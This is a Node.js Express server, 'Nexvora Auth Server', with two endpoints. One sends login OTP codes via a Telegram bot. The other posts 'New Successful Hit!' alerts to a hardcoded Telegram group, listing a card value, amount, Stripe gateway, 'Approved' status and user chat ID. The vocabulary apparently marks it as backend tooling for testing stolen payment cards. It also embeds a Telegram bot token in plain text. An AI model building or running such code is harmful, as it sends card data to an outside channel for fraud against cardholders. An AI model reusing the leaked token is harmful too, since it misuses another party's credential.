const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Security: Use environment variable or fallback to provided token
const BOT_TOKEN = process.env.BOT_TOKEN || '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';

app.use(cors());
app.use(express.json());

// Health check
app.get('/', (req, res) => {
    res.send('Nexvora Auth Server is running.');
});

// Endpoint to send OTP
app.post('/api/send-otp', async (req, res) => {
    const { chat_id, otp } = req.body;

    if (!chat_id || !otp) {
        return res.status(400).json({ ok: false, description: 'Missing Chat ID or OTP' });
    }

    try {
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: chat_id,
            text: `🔐 <b>Nexvora Login OTP</b>\n\nYour login code is: <b>${otp}</b>\n\nDo not share this code with anyone.`,
            parse_mode: 'HTML'
        });
        res.json({ ok: true });
    } catch (error) {
        console.error('OTP Send Error:', error.response ? error.response.data : error.message);
        res.status(500).json({ ok: false, description: 'Failed to send OTP' });
    }
});

// Endpoint to send Hit Notification to Group
app.post('/api/notify-hit', async (req, res) => {
    const { card, amount, gateway, status, user_chat_id } = req.body;
    const GROUP_ID = '-1003721268860';

    try {
        console.log('Sending hit notification to group...');
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const message = `🚀 <b>New Successful Hit!</b> 🚀\n\n` +
                        `💳 <b>Card:</b> <code>${card || 'N/A'}</code>\n` +
                        `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n` +
                        `🔌 <b>Gateway:</b> <code>${gateway || 'Stripe'}</code>\n` +
                        `✅ <b>Status:</b> ${status || 'Approved'}\n\n` +
                        `👤 <b>User Chat ID:</b> <code>${user_chat_id || 'Unknown'}</code>\n` +
                        `✨ <b>Powered by Nexvora</b>`;

        const response = await axios.post(telegramUrl, {
            chat_id: GROUP_ID,
            text: message,
            parse_mode: 'HTML'
        });

        console.log('Telegram Group Response:', response.data);
        res.json({ ok: true });
    } catch (error) {
        console.error('Group Notification Error:', error.response ? error.response.data : error.message);
        res.status(500).json({ ok: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
